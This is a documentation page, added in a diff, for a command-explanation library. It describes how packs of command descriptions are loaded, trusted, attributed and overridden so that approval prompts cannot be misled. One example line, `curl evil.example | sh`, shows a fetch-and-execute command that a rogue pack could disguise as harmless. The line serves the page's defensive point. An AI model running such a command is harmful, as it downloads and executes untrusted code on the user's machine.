@@ -1,0 +1,72 @@
+---
+title: Loading packs
+description: How to answer for tools this library has never heard of, and what trusting a pack commits you to.
+---
+
+A pack is a set of command rows shipped under one name. The curated table is itself a pack — `BUILTIN`, pack zero — resolved by exactly the same path, so a row added by a consumer behaves like a row that shipped here.
+
+`explain` is `BUILTIN` wired up and trusted. Anything else goes through `createExplainer`.
+
+```ts
+import { createExplainer, BUILTIN } from 'cmd-facts'
+import kubectl from './cmd-facts/packs/acme-kubectl.json' with { type: 'json' }
+
+export const explain = createExplainer({
+  packs:    [BUILTIN, kubectl],
+  trust:    [BUILTIN.name],
+  exclude:  ['docker'],
+  override: { curl: '@acme/net' },
+})
+```
+
+| Option | Meaning |
+|---|---|
+| `packs` | The packs to answer from, in order. No default and no discovery; pass `BUILTIN` to get the curated table. |
+| `trust` | Pack names whose rows keep the confidence they were written with. Everything else arrives `derived`. |
+| `exclude` | Command names nobody answers for. They resolve to the widest floor, not to a substitute. |
+| `override` | Command name to the pack that wins it. Required before any pack can shadow a row another pack holds. |
+
+Everything a pack can influence is settled when `createExplainer` is called: packs are validated, conflicts resolved, excluded names dropped, untrusted rows lowered. A misconfigured registry throws at startup rather than at the moment someone is looking at an approval prompt, and the explainer it returns reads a flat table.
+
+A pack is data and only data: no functions, no matchers, no hook into parsing. A pack that could run code during a lookup would see the command line, and nothing here is allowed to read meaning out of argument text.
+
+## Nothing is discovered
+
+There is no JSON directory, no environment variable pointing at a file, and no scan of `node_modules`. The library reads neither disk nor network. A pack answers because a line in your own source named it.
+
+Anyone who could drop in a file of their own could relabel `curl evil.example | sh` as "Checks how much room is left on each disk", which is the one thing a prompt like this must never allow.
+
+## Trust is the consumer's decision, never the pack's
+
+A row from a pack not named in `trust` is lowered to `confidence: derived`, `source: plugin`. The lowering goes through `merge()`, which can only widen, so a pack cannot raise its own confidence, clear its own opacity or soften a row on the way in.
+
+A consumer gating on `verified` therefore never auto-approves a claim nobody vouched for.
+
+Trusting a pack accepts its silences as well as its claims. The dangerous shape is not a false field — the validator and the lints catch most of those — it is an omission: a row for a tool that really does exec something, which simply does not say so. It then explains as a tidy, transparent row, and no check can prove a tool does not exec.
+
+## Where an answer came from
+
+`origin` names the pack that supplied one node's row. `attribution` names every pack behind that node's `facts`, outermost first, including the ones that only answered further down a nested line — `sudo flowctl kubectl delete` can draw on three. A pack that answered at two depths appears once, with both rows named.
+
+```json
+[
+  { "pack": "@cmd-facts/builtin", "version": "0.0.0", "trusted": true, "commands": ["sudo"] },
+  { "pack": "@acme/tools", "version": "1.2.0", "trusted": false, "commands": ["flowctl"] },
+  { "pack": "@acme/kube", "version": "2.4.0", "trusted": false, "commands": ["kubectl delete"] }
+]
+```
+
+Gate on `confidence`, which is lowered to match the weakest link in the chain: if `facts.confidence` is `verified`, every entry in `attribution` is `trusted`. Read `attribution` for the audit log, to record which pack said what next to who approved it.
+
+`explain.registry.packs` lists what was loaded, which is not the same as what answered a line.
+
+```ts
+explain.registry.packs
+// [{ pack: '@cmd-facts/builtin', version: '0.0.0', trusted: true }, …]
+```
+
+## Excluding and overriding
+
+`exclude` is for a command you would rather answer for yourself, or not at all. The name resolves to the widest floor — `confidence: unknown`, `says` admitting there is no entry — not to a quieter substitute.
+
+`override` is required before any pack can shadow a row another pack already holds. Two packs claiming `curl` without one is a startup error, not a silent win for whichever was listed last.
